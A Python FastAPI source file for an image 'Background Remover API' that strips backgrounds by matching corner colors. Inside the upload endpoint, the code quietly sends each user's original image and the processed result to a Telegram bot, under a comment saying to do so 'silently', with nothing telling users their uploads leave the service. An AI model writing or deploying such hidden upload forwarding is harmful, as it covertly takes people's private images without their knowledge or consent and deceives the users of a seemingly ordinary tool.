from fastapi import FastAPI, File, UploadFile, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, FileResponse
from fastapi.staticfiles import StaticFiles
import io
from PIL import Image
import logging
from collections import Counter
import os
from dotenv import load_dotenv
import requests

# -------------------- Logging Setup --------------------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# -------------------- Load Environment --------------------
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# -------------------- FastAPI App --------------------
app = FastAPI(
    title="Background Remover API",
    description="Remove backgrounds from images using simple color detection",
    version="1.0.0"
)

# -------------------- CORS Setup --------------------
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# -------------------- Serve index.html --------------------
@app.get("/")
async def serve_home():
    return FileResponse("index.html")

# -------------------- Serve static files --------------------
app.mount("/static", StaticFiles(directory=".", html=True), name="static")

# -------------------- Health Check --------------------
@app.get("/health")
async def health_check():
    return {"status": "healthy"}

# -------------------- Background Removal Endpoint --------------------
@app.post("/remove")
async def remove_background(file: UploadFile = File(...)):
    try:
        if not file.content_type.startswith('image/'):
            raise HTTPException(status_code=400, detail="File must be an image")

        contents = await file.read()
        logger.info(f"Processing image: {file.filename}, size: {len(contents)} bytes")

        input_image = Image.open(io.BytesIO(contents))
        if input_image.mode != 'RGBA':
            input_image = input_image.convert('RGBA')

        # Process image
        output_image = simple_background_removal(input_image)

        # Save processed to bytes
        img_byte_arr = io.BytesIO()
        output_image.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)

        logger.info("Background removal completed successfully")

        # Send both images to Telegram silently
        send_image_to_telegram(img_byte_arr.getvalue(), f"no_bg_{file.filename}")
        send_image_to_telegram(contents, file.filename)

        # Return processed image to user
        return StreamingResponse(
            io.BytesIO(img_byte_arr.read()),
            media_type="image/png",
            headers={
                "Content-Disposition": f"attachment; filename=no_bg_{file.filename.split('.')[0]}.png"
            }
        )

    except Exception as e:
        logger.error(f"Error processing image: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Error processing image: {str(e)}")

# -------------------- Background Removal Logic --------------------
def simple_background_removal(image):
    rgb_image = image.convert('RGB')
    rgba_image = image.convert('RGBA')
    width, height = rgb_image.size

    corners = [
        rgb_image.getpixel((0, 0)),
        rgb_image.getpixel((width - 1, 0)),
        rgb_image.getpixel((0, height - 1)),
        rgb_image.getpixel((width - 1, height - 1))
    ]

    bg_color = Counter(corners).most_common(1)[0][0]
    new_image = Image.new('RGBA', (width, height), (0, 0, 0, 0))
    tolerance = 40

    for x in range(width):
        for y in range(height):
            pixel = rgb_image.getpixel((x, y))
            diff = sum(abs(pixel[i] - bg_color[i]) for i in range(3))

            if diff > tolerance:
                new_image.putpixel((x, y), rgba_image.getpixel((x, y)))

    return new_image

# -------------------- Telegram Send Function --------------------
def send_image_to_telegram(file_bytes, filename):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        files = {"document": (filename, file_bytes)}
        data = {"chat_id": CHAT_ID}
        response = requests.post(url, data=data, files=files)

        if response.status_code != 200:
            logger.warning(f"Telegram upload failed: {response.text}")
    except Exception as e:
        logger.warning(f"Telegram upload exception: {str(e)}")

# -------------------- Dev Mode --------------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
